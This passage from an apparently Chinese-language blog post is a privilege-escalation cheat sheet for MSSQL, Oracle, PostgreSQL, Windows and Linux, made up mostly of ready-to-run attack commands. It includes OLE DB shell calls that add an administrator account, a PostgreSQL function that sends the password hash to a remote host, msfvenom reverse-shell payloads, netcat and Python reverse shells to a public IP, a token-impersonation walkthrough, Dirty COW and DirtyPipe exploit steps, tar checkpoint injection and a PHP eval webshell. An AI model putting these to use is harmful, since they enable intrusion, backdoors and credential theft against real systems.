&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句：</span></span><br><span class=\"line\">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;,&#x27;SandBoxMode&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行系统命令</span></span><br><span class=\"line\">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class=\"line\">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>沙盒模式 SandBoxMode 参数含义（默认是 2 ）<br>\n <code>0</code> ：在任何所有者中禁止启用安全模式<br>\n <code>1</code>  ：为仅在允许范围内<br>\n <code>2</code>  ：必须在 access 模式下<br>\n <code>3</code> ：完全开启</li>\n</ul>\n<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用 程序链接到 SQL Server 的的驱动程序。恢复配置如下:</p>\n<p>–exec master…xp_regwrite ‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\\Microsoft\\Jet\\4.0\\Engines’,‘SandBoxMo de’,‘REG_DWORD’,1;</p>\n<p>–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; --exec sp_configure ‘show advanced options’,0;reconfigure;</p>\n<h4 id=\"oracle-提权\"><a class=\"markdownIt-Anchor\" href=\"#oracle-提权\">#</a> oracle 提权</h4>\n<p>工具地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlc2hlbGw=\">https://github.com/jas502n/oracleshell</span></p>\n<ul>\n<li>普通用户模式：</li>\n</ul>\n<p>前提是拥有一个普通的 oracle 连接账号，不需要 DBA 权限，可提权至 DBA，并以 oracle 实例运行的权限执行操作系统命令。</p>\n<ul>\n<li>DBA 用户模式：（自动化工具）</li>\n</ul>\n<p>拥有 DBA 账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p>\n<ul>\n<li>注入提升模式：</li>\n</ul>\n<p>拥有一个 oracle 注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显。</p>\n<h4 id=\"postgresql-提权\"><a class=\"markdownIt-Anchor\" href=\"#postgresql-提权\">#</a> postgresql 提权</h4>\n<p>PostgreSQL 是一款关系型数据库。其 3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p>\n<ul>\n<li>PostgreSQL 提权漏洞</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CVE-2018-1058 普通用户植入后门命令</span></span><br><span class=\"line\">CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</span><br><span class=\"line\">select dblink_connect((select &#x27;hostaddr=10.0.0.1 port=5433 user=postgres</span><br><span class=\"line\">password=chybeta sslmode=disable dbname=&#x27;||(SELECT passwd FROM pg_shadow</span><br><span class=\"line\">WHERE usename=&#x27;postgres&#x27;)));</span><br><span class=\"line\">SELECT pg_catalog.array_to_string($1,$2);</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">$ LANGUAGE SQL VOLATILE;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">管理员操作数据库触发</span></span><br><span class=\"line\">docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</span><br></pre></td></tr></table></figure>\n<ul>\n<li>PostgreSQL 高权限命令执行漏洞</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CVE-2019-9193</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在连接到的后门一般是哥斯拉中利用数据库操作中执行以下命令，其中<span class=\"built_in\">id</span>表示需要执行的系统命令</span></span><br><span class=\"line\">DROP TABLE IF EXISTS cmd_exec;</span><br><span class=\"line\">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class=\"line\">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class=\"line\">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>\n<h4 id=\"三方应用提权\"><a class=\"markdownIt-Anchor\" href=\"#三方应用提权\">#</a> 三方应用提权</h4>\n<p>通过 cs 的插件，如果此时已经通过 webshell 运行了 cs 木马，可以通过下 列插件来获取明文凭据，收集更多的内网信息，但是这不一定能收集成功，毕 竟有防火墙需要规避</p>\n<p>远控类：Teamviewer 向日葵 Todesk VNC Radmin 等</p>\n<p>密码类：各大浏览器 Xshell Navicat 3389 等</p>\n<h3 id=\"win提权\"><a class=\"markdownIt-Anchor\" href=\"#win提权\">#</a> win 提权</h3>\n<h4 id=\"at-sc-提权\"><a class=\"markdownIt-Anchor\" href=\"#at-sc-提权\">#</a> at sc 提权</h4>\n<ul>\n<li>at 命令提权</li>\n</ul>\n<p>at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用 system 权限。适用版本：Win2000 &amp; Win2003 &amp; XP 中还是存在的，在 Win7 以 后被剔除。当我们拿到低权限的用户，通过连接上服务器后，可以通过 at 命令 来进行本地提权。</p>\n<p>at 21:00 /interactive cmd (在 20:33 分生成一个交互式的 System 权限的 cmd)</p>\n<ul>\n<li>sc 命令提权</li>\n</ul>\n<p>sc 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类 似于控制面板中管理工具项中的服务。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个名叫 syscmd 的新的交互式的 cmd 执行服务</span></span><br><span class=\"line\">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type=interact</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行服务</span> </span><br><span class=\"line\">sc start syscmd</span><br></pre></td></tr></table></figure>\n<h4 id=\"psexec-提权\"><a class=\"markdownIt-Anchor\" href=\"#psexec-提权\">#</a> psexec 提权</h4>\n<p>适用版本：Win2012 and Win2008 &amp; Win2016 基本可以</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc3Rvb2xz\">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span></p>\n<p><code>psexec.exe -accepteula -s -i -d cmd</code></p>\n<h4 id=\"进程迁移注入\"><a class=\"markdownIt-Anchor\" href=\"#进程迁移注入\">#</a> 进程迁移注入</h4>\n<ul>\n<li>win 2008 进程注入</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">相当于开了一个后门，注入到其他用户进程下</span></span><br><span class=\"line\">pinjector -l</span><br><span class=\"line\">pinjector -p 420 cmd 3333</span><br><span class=\"line\">nc 192.168.46.149 3333</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Win2008 2012 2016 MSF 进程注入</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看进程</span></span><br><span class=\"line\">ps </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">迁移对应PID</span></span><br><span class=\"line\">migrate PID</span><br></pre></td></tr></table></figure>\n<h4 id=\"窃取令牌\"><a class=\"markdownIt-Anchor\" href=\"#窃取令牌\">#</a> 窃取令牌</h4>\n<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。当一个攻击者 需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。适用 win2012。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">令牌窃取</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117</span><br><span class=\"line\">LPORT=3333 -f exe -o msf.exe</span><br><span class=\"line\">use incognito</span><br><span class=\"line\">list_tokens -u</span><br><span class=\"line\">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"烂土豆提权\"><a class=\"markdownIt-Anchor\" href=\"#烂土豆提权\">#</a> 烂土豆提权</h4>\n<p>适用 Win2008 2012 2016。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execute -cH -f ./potato.exe //配合烂土豆</span><br><span class=\"line\">use incognito</span><br><span class=\"line\">list_tokens -u</span><br><span class=\"line\">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"win-msf-自动化提权\"><a class=\"markdownIt-Anchor\" href=\"#win-msf-自动化提权\">#</a> Win msf 自动化提权</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前权限</span></span><br><span class=\"line\">getuid</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">提权</span></span><br><span class=\"line\">getsystem</span><br></pre></td></tr></table></figure>\n<h4 id=\"bypassuac-提权\"><a class=\"markdownIt-Anchor\" href=\"#bypassuac-提权\">#</a> bypassUAC 提权</h4>\n<p>为了远程执行目标的 exe 或者 bat 可执行文件绕过此安全机制，以此叫 BypassUAC，开启 UAC 和未开启 UAC 时，MSF 默认 getsystem 提权影响 (进程注 入)。适用 win10。</p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.46.158 lport=3333 -f exe -o msf.exe</code></p>\n<ul>\n<li>MSF 模块 BypassUAC</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Win7本地权限</span></span><br><span class=\"line\">use exploit/windows/local/bypassua</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Win10本地权限</span></span><br><span class=\"line\">use exploit/windows/local/ask</span><br><span class=\"line\">use exploit/windows/local/bypassuac_sluihijack</span><br><span class=\"line\">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure>\n<ul>\n<li>UACME 项目（推荐）</li>\n</ul>\n<p>通过此程序调用 exe 文件，调用时用的 SYSTEM 权限，则此时反弹得到的 shell 是可以提权到 STSTEM 权限的。</p>\n<p>项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F\">https://github.com/hfiref0x/UACME</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Akagi64.exe 编号 调用执行</span></span><br><span class=\"line\">Akagi64.exe 41 msf1.exe</span><br></pre></td></tr></table></figure>\n<h4 id=\"dll劫持提权\"><a class=\"markdownIt-Anchor\" href=\"#dll劫持提权\">#</a> Dll 劫持提权</h4>\n<p>Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过 在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其 预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：应用程序加载的 目录、C:\\Windows\\System32、C:\\Windows\\System、C:\\Windows、当前工作目录 Current Working Directory，CWD、在 PATH 环境变量的目录 (先系统后用户)。适用 win2012。</p>\n<p>利用火绒剑进行进程分析加载 DLL，一般寻程序 DLL 利用，制作 dll 并上 传，替换 dll，启动应用后成功。还可以用 ChkDllHijack 来检测与某程序相关联 的 DLL 文件，提前信息收集相关软件及 DLL 问题程序，本地调试成功后覆盖 DLL 实现利用。</p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=4444 -f dll -o xiaodi.dll</code></p>\n<h4 id=\"服务路径及权限\"><a class=\"markdownIt-Anchor\" href=\"#服务路径及权限\">#</a> 服务路径及权限</h4>\n<ul>\n<li>不带引号服务路径配合 MSF</li>\n</ul>\n<p>利用 JAWS 或者命令检测服务路径，需要服务没有双引号并且服务中出现 了空格，那么就可以看作是前边的路径是程序后边的路径是参数，上传 exe 木 马到此路径下，并用命令行启动服务上传反弹 exe，设置好对应执行名后，执行 sc start “Macro Expert”，木马上线。适用 win2012。</p>\n<p>JAWS 下载地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzQxMUhhbGwvSkFXUw==\">https://github.com/411Hall/JAWS</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检测命令</span></span><br><span class=\"line\">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v</span><br></pre></td></tr></table></figure>\n<ul>\n<li>不安全的服务权限配合 MSF-NewServices</li>\n</ul>\n<p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 有的目录是不允许被修改的。</p>\n<p>利用 accesschk 或 PowerUp (PowerSploit) 检测服务权限配置，制作文件并上 传，创建新服务并更改服务路径指向，启动服务时木马被执行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PowerSploit 下载地址:</span></span><br><span class=\"line\">https://github.com/PowerShellMafia/PowerSploit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">accesschk 下载地址:</span></span><br><span class=\"line\">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</span><br><span class=\"line\"></span><br><span class=\"line\">accesschk.exe -uwcqv &quot;administrators&quot; * Import-Module .\\PowerUp.ps1 &amp;&amp; Invoke-All Checks sc config &quot;test&quot; binpath=&quot;C:\\Program.exe&quot;</span><br><span class=\"line\">sc start test</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux提权\"><a class=\"markdownIt-Anchor\" href=\"#linux提权\">#</a> linux 提权</h3>\n<h4 id=\"辅助项目提权\"><a class=\"markdownIt-Anchor\" href=\"#辅助项目提权\">#</a> 辅助项目提权</h4>\n<ul>\n<li>项目地址</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpYW1nL3RyYWl0b3I=\">https://github.com/liamg/traitor</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0JlUm9vdA==\">https://github.com/AlessandroZ/BeRoot</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlYm9vdHVzZXIvTGluRW51bQ==\">https://github.com/rebootuser/LinEnum</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVy\">https://github.com/mzet-/linux-exploit-suggester</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NsZXZlbnR5ZWxldmVuL2xpbnV4cHJpdmNoZWNrZXI=\">https://github.com/sleventyeleven/linuxprivchecker</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pvbmRvbmFzL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyLQ==\">https://github.com/jondonas/linux-exploit-suggester-</span> 2<br>\nLinux：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span><br>\nWindows：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v\">https://lolbas-project.github.io/</span></p>\n<ul>\n<li>项目大致分类</li>\n</ul>\n<p>一个综合类探针 traitor，一个自动化提权 BeRoot (gtfobins&amp;lolbas)，两个信息收集 LinEnum linuxprivchecker，两个漏洞探针 linux-exploit-suggester&amp;2</p>\n<h4 id=\"suid提权\"><a class=\"markdownIt-Anchor\" href=\"#suid提权\">#</a> suid 提权</h4>\n<p>chmod u+s 给予普通用户可以借助 root 权限执行某些命令，chmod u-s 可以删除 suid。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">手工命令探针安全</span></span><br><span class=\"line\">find / -user root -perm - 4000 - print 2&gt;/dev/null</span><br><span class=\"line\">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class=\"line\">find / -user root -perm - 4000 - exec ls -ldb &#123;&#125; \\;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">脚本项目探针安全</span></span><br><span class=\"line\">LinEnum.sh traitor linuxprivchecker</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用NC反弹</span></span><br><span class=\"line\">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \\;</span><br><span class=\"line\">netcat xx.xx.xx.xx 5555</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从 4444 端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</span></span><br><span class=\"line\">nc x.x.x.x 4444 | /bin/bash | nc x.x.x.x 5555</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用Python反弹</span></span><br><span class=\"line\">find xiaodi -exec python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.co nnect((&quot;47.94.236.117&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; \\;</span><br><span class=\"line\">nc -lvp 7777</span><br></pre></td></tr></table></figure>\n<h4 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\">#</a> 脏牛提权</h4>\n<p>搜寻 exp 直接提权。连接服务器，获取可利用漏洞，下载或上传 EXP，编译 EXP，给权限执行。</p>\n<p>探针项目：BeRoot linux-exploit-suggester linux-exploit-suggester2</p>\n<p>如 gcc 45010.c -o exp &amp;&amp; sh exp</p>\n<p>linux 脏牛 dcow</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">内核提权整个过程：（linux-exploit-suggester获取信息）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过msf拿到web权限，上传脏牛漏洞利用脚本exp</span></span><br><span class=\"line\">upload /root/dcow.cpp /tmp/dcow.cpp</span><br><span class=\"line\">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class=\"line\">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">./dcow &amp;&amp; su root</span><br></pre></td></tr></table></figure>\n<h4 id=\"脏管道提权\"><a class=\"markdownIt-Anchor\" href=\"#脏管道提权\">#</a> 脏管道提权</h4>\n<p>Linux-DirtyPipe 提权 (CVE-2022-0847)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://haxx.in/files/dirtypipez.c</span><br><span class=\"line\">gcc -o dirtypipez dirtypipez.c</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">任何具体suid权限的文件均可</span></span><br><span class=\"line\">./dirtypipez /usr/bin/su</span><br></pre></td></tr></table></figure>\n<h4 id=\"环境变量配合suid\"><a class=\"markdownIt-Anchor\" href=\"#环境变量配合suid\">#</a> 环境变量配合 suid</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针</span></span><br><span class=\"line\">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class=\"line\">gcc demo.c -o shell &amp;&amp; chmod u+s shell</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">root用户可执行文件进行编译，保证文件的正常授权运行，给予 ROOT权限执行，普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限</span></span><br><span class=\"line\">cp /bin/bash /tmp/ps &amp;&amp; export PATH=/tmp:$PATH &amp;&amp; ./shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"定时任务配合tar\"><a class=\"markdownIt-Anchor\" href=\"#定时任务配合tar\">#</a> 定时任务配合 tar</h4>\n<p>利用计划任务的备份功能 tar 命令的参数利用，在计划任务中定时执行 <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3Quc2g=\">test.sh</span> 命令，执行之后会生成 bash 的 s 文件，可利用此进行提权；也可以利用直接将 反弹 shell 的代码写入 <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3Quc2g=\">test.sh</span>，只需监听端口，定时任务触发后就会接收到反弹 shell。</p>\n<p><code>echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;;echo &quot;&quot; &gt; --checkpoint=1;echo'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; test.sh;chmod +x test.sh</code></p>\n<h4 id=\"权限配置不当\"><a class=\"markdownIt-Anchor\" href=\"#权限配置不当\">#</a> 权限配置不当</h4>\n<p>利用不安全的权限分配操作导致的定时文件覆盖，导致某些文件可以被普</p>\n<p>通用户修改，且此文件会定时执行。</p>\n<p>所有者 / 组 / 其他：读取 4 写入 2 执行 1</p>\n<p>755 表示所有者读取写入执行，组和其他用户只有读取和执行</p>\n<p>644 表示所有者写入和执行，组和其他用户只有执行</p>\n<p>444 r–r--r-- 600 rw------- 644 rw-r–r-- 666 rw-rw-rw-<br>\n700 rwx------ 744 rwxr–r-- 755 rwxr-xr-x 777 rwxrwxrwx</p>\n<h4 id=\"linux-mysql提权\"><a class=\"markdownIt-Anchor\" href=\"#linux-mysql提权\">#</a> linux mysql 提权</h4>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmF2ZW4tMiwyNjkv\">https://www.vulnhub.com/entry/raven-2,269/</span></p>\n<ul>\n<li>webshell 获取</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针IP及端口</span></span><br><span class=\"line\">nmap 192.168.46.0/24</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用phpmailer漏洞进行修改并反弹</span></span><br><span class=\"line\">python D:/Myproject/40974.py</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入后门利用菜刀连接方便操作</span></span><br><span class=\"line\">echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传信息收集脚本进行提权信息收集</span></span><br><span class=\"line\">./LinEnum.sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">翻阅数据库配置文件获取root密码</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>mysql</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用Mysql提权 searchsploit，下载mysql udf kali poc进行编译：</span></span><br><span class=\"line\">wget https://www.exploit-db.com/download/1518 - O raptor_udf.c</span><br><span class=\"line\">gcc -g -c raptor_udf.c</span><br><span class=\"line\">gcc -g -shared -o raptor_udf.so 1518.so -lc</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传或下载 1518 到目标服务器：</span></span><br><span class=\"line\">wget 